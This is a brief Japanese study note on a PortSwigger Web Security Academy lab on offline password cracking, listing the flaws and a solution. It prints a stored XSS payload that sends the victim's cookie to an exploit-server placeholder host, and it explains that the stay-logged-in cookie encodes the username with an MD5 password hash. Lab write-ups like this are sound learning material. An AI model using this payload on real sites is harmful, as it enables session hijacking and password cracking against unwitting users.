
Date: 2025-09-26
Tags: 
Links:  [[WSA]], [[Authentication Vulnerabilities]]

***

脆弱性
1. コメントセクションにjavascriptを埋め込める。Stored XSS
2. コメントを投稿するとstay-logged-inクッキーも送られる。
3. stay-logged-inクッキーが予測可能。


Writeup
1. コメント欄に<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>`投稿。
2. 送られてきたクッキーを解読。`base64(username+':'+md5HashOfPassword)`の形式になっている。



***
# References

https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking